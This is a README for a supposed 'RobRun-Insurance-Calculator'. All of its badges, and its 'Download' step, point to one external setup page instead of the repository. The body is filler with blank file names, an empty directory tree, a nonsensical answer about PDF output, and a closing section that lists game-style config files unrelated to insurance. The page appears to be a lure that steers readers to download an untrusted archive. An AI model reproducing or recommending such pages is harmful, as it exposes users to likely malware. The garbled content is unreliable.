RobRun-Insurance-Calculator:
# RobRun-Insurance-Calculator

<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Download-Release-0369a1?style=plastic&logo=files&logoColor=white" alt="Download">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/License-MIT-007ec6?style=for-the-badge&logo=opensource" alt="License">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Size-15MB-2ecc71?style=flat-square&logo=harddisk" alt="Size">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Last%20Updated-2024-11-20-9b59b6?style=flat&logo=calendar" alt="Last Updated">
</a>
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Downloads-10k-orange?style=flat&logo=download" alt="Downloads">
</a>

---

## Overview

RobRun-Insurance-Calculator is a fully‑structured, data‑driven utility designed to provide precise insurance cost estimations for RobRun events. It separates configuration, logic, and presentation into clear files, enabling easy customization without touching the core code base. The package ships with a curated set of workflow presets that map common event types to predefined calculation rules, ensuring that users can generate consistent results across multiple scenarios.

---

## Workflow Presets

RobRun-Insurance-Calculator ships with five ready‑made presets that can be toggled via the `preset` parameter in the command line interface:

| Preset | Event Type | Applicable Rules |
|--------|------------|------------------|
| **Standard** | General races | Base rate + tax |
| **Endurance** | Long‑distance runs | Extra endurance surcharge |
| **Sprint** | Short bursts | Speed multiplier applied |
| **Team** | Team events | Group discount applied |
| **Custom** | User‑defined | Uses values from `` |

The preset system allows users to switch contexts quickly, making the calculator a versatile companion for both organizers and participants.

---

## Getting Started

1. **Download** the latest bundle from the badge link above.
2. Extract the archive to a folder of your choice.
3. Open a terminal and navigate to the extraction directory.
4. Run the calculator via the provided script:

   ```
   python run_insurance.py --preset Standard --event "City Marathon" --participants 250
   ```

   The script accepts the following mandatory flags:
   - `--event` – Name of the event.
   - `--participants` – Total number of participants.
   - `--preset` – (Optional) One of the presets listed above.

5. Results are output to `results/report.txt` and an optional PDF if `` enables it.
6. For advanced usage, edit `` to override default rates or add new multipliers.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **Why does the calculator produce a high estimate?** | Verify that `` is not overriding `base_rate` with an unintended value. |
| **Can I generate a PDF report?** | Set `show_logo=true` and `color_scheme=dark` in ``. The script will emit `report.pdf`. |
| **The utility fails on large participant numbers.** | Check the `max_participants` limit in ``. Increase it if necessary. |
| **How do I add a new event type?** | Create a new preset in `` and define its rules. The utility will pick it up automatically. |
| **Where can I report bugs or request features?** | Open an issue on this repository. Include the exact command used and any log snippets. |

---

## Directory Tree

<pre>
RobRun-Insurance-Calculator/
├─ run_insurance.py
├─ config/
│  ├─
│  ├─
│  ├─
│  └─
├─
├─ results/
│  ├─ report.txt
│  └─ report.pdf
├─ README.md
└─ LICENSE
</pre>

---

## Contributing

Contributions that expand preset logic, improve documentation, or translate the user manual into other languages are welcome. Before submitting a pull request, please ensure that:

1. All new files are placed under `config/` or `` as appropriate.
2. No hard‑coded values are introduced in the core script.
3. The README is updated if new features are added.

Happy calculating!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```